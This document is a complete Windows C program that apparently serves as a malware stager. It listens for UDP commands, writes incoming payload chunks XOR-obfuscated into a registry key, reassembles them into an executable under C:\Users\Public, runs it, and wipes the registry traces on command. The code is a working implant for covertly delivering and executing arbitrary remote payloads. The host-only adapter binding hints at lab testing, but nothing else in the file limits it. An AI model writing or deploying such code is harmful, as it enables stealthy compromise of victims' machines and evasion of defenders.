#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <iphlpapi.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")

#define XOR_KEY 0xAF
#define CHUNK_SIZE 1024
#define REG_BASE_KEY "Software\\PayloadStage"
#define MAX_CHUNKS 1000
#define UDP_PORT 5555

char FILE_OUT[MAX_PATH] = "C:\\Users\\Public\\streamload.bin";

// Helper function to get host-only adapter IP
char* get_host_only_ip() {
    PIP_ADAPTER_INFO adapter;
    PIP_ADAPTER_INFO adapter_list = NULL;
    ULONG buf_len = 0;
    
    if (GetAdaptersInfo(NULL, &buf_len) == ERROR_BUFFER_OVERFLOW) {
        adapter_list = (IP_ADAPTER_INFO*)malloc(buf_len);
        if (GetAdaptersInfo(adapter_list, &buf_len) == ERROR_SUCCESS) {
            for (adapter = adapter_list; adapter != NULL; adapter = adapter->Next) {
                if (strstr(adapter->Description, "VirtualBox") || 
                    strstr(adapter->Description, "Host-Only")) {
                    return adapter->IpAddressList.IpAddress.String;
                }
            }
        }
        free(adapter_list);
    }
    return "0.0.0.0";  // Fallback to any interface
}

void xor_buffer(BYTE *buf, DWORD len) {
    for (DWORD i = 0; i < len; i++)
        buf[i] ^= XOR_KEY;
}

void store_chunk(const char* name, BYTE* data, DWORD size) {
    xor_buffer(data, size);
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, REG_BASE_KEY, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, name, 0, REG_BINARY, data, size);
        RegCloseKey(hKey);
    }
}

DWORD read_chunk(const char* name, BYTE* out) {
    DWORD size = CHUNK_SIZE;
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, REG_BASE_KEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, name, NULL, NULL, out, &size) != ERROR_SUCCESS) {
            size = 0;
        }
        RegCloseKey(hKey);
    } else {
        size = 0;
    }
    if (size > 0) xor_buffer(out, size);
    return size;
}

void rebuild_file() {
    FILE *fp = fopen(FILE_OUT, "wb");
    if (!fp) return;

    BYTE buffer[CHUNK_SIZE];
    char key[32];
    DWORD len;

    for (int i = 0; i < MAX_CHUNKS; i++) {
        snprintf(key, sizeof(key), "chunk_%03d", i);
        len = read_chunk(key, buffer);
        if (len == 0) break;
        fwrite(buffer, 1, len, fp);
    }
    fclose(fp);
}

void clear_registry_chunks() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, REG_BASE_KEY, 0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
        return;

    char name[256];
    DWORD nameLen = sizeof(name);
    while (RegEnumValueA(hKey, 0, name, &nameLen, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, name);
        nameLen = sizeof(name);
    }
    RegCloseKey(hKey);
}

void handle_command(SOCKET sock, char* buffer, int len, struct sockaddr_in* client_addr, int client_len) {
    // Null-terminate the command
    buffer[len] = '\0';
    
    if (strncmp(buffer, "rebuild", 7) == 0) {
        rebuild_file();
        sendto(sock, "[+] File rebuilt", 16, 0, (struct sockaddr*)client_addr, client_len);
    }
    else if (strncmp(buffer, "clear", 5) == 0) {
        clear_registry_chunks();
        sendto(sock, "[+] Registry cleared", 20, 0, (struct sockaddr*)client_addr, client_len);
    }
    else if (strncmp(buffer, "run", 3) == 0) {
        STARTUPINFO si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        CreateProcessA(FILE_OUT, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        sendto(sock, "[+] Executing file", 18, 0, (struct sockaddr*)client_addr, client_len);
    }
    else if (strncmp(buffer, "exit", 4) == 0) {
        sendto(sock, "[+] Exiting", 11, 0, (struct sockaddr*)client_addr, client_len);
        exit(0);
    }
    else if (strncmp(buffer, "chunk:", 6) == 0) {
        // Format: chunk:<index>:<data>
        char* index_str = buffer + 6;
        char* data_ptr = strchr(index_str, ':');
        if (data_ptr) {
            *data_ptr = '\0';
            int index = atoi(index_str);
            data_ptr++;
            int data_len = len - (data_ptr - buffer);
            
            char key[32];
            snprintf(key, sizeof(key), "chunk_%03d", index);
            store_chunk(key, (BYTE*)data_ptr, data_len);
            
            sendto(sock, "[+] Chunk stored", 16, 0, (struct sockaddr*)client_addr, client_len);
        }
    }
    else if (strncmp(buffer, "ping", 4) == 0) {
        sendto(sock, "[+] Pong", 8, 0, (struct sockaddr*)client_addr, client_len);
    }
    else {
        sendto(sock, "[!] Unknown command", 19, 0, (struct sockaddr*)client_addr, client_len);
    }
}

int main() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    char buffer[CHUNK_SIZE + 16];  // Extra space for command prefixes
    char* host_only_ip = get_host_only_ip();

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        return 1;
    }

    // Create socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    // Prepare the sockaddr_in structure
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(host_only_ip);
    server.sin_port = htons(UDP_PORT);

    // Bind to host-only interface
    if (bind(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    printf("[*] Listening on %s:%d\n", host_only_ip, UDP_PORT);

    while (1) {
        struct sockaddr_in client;
        int client_len = sizeof(client);
        int len = recvfrom(sock, buffer, sizeof(buffer) - 1, 0, (struct sockaddr*)&client, &client_len);
        if (len > 0) {
            handle_command(sock, buffer, len, &client, client_len);
        }
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}
